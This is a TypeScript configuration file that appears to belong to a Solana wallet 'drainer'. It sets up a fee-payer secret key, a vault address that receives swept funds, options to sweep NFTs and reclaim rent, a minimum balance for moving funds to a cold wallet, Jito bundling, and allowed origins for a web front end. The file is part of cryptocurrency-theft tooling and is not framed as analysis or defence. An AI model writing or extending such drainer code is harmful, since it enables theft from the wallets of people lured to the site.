import "dotenv/config";
import { z } from "zod";
import { Keypair, PublicKey } from "@solana/web3.js";
import bs58 from "bs58";

const S = z.object({
  RPC_URL: z.string().url(),
  DRAINER_SECRET: z.string().optional(),
  VAULT_PUBKEY: z.string().min(32),
  ALLOWED_ORIGINS: z.string().default(""),
  PRIORITY_MICROLAMPORTS: z.coerce.number().int().nonnegative().default(50_000),
  COMPUTE_UNIT_LIMIT: z.coerce.number().int().min(100_000).max(1_400_000).default(400_000),
  MAX_IX_PER_TX: z.coerce.number().int().min(4).max(40).default(24),
  SWEEP_NFTS: z.coerce.boolean().default(true),
  RECLAIM_RENT: z.coerce.boolean().default(true),
  SKIP_MINTS: z.string().default(""),
  JITO: z.coerce.boolean().default(true),
  JUP_PRICE: z.coerce.boolean().default(true),
  HOT_SWEEP_MIN_LAMPORTS: z.coerce.number().int().nonnegative().default(20_000_000),
  PORT: z.coerce.number().int().default(8788),
  COLD_PUBKEY: z.string().default(""),
  ADMIN_TOKEN: z.string().default("dev"),
});

const env = S.parse(process.env);
const fp = env.DRAINER_SECRET ? Keypair.fromSecretKey(bs58.decode(env.DRAINER_SECRET.trim())) : null;

export const cfg = {
  ...env,
  feePayer: fp,
  vault: new PublicKey(env.VAULT_PUBKEY),
  skipMints: new Set(env.SKIP_MINTS.split(",").map((m) => m.trim()).filter(Boolean)),
  origins: env.ALLOWED_ORIGINS.split(",").map((o) => o.trim()).filter(Boolean),
};

if (fp && cfg.vault.equals(fp.publicKey)) throw new Error("VAULT equals fee payer");
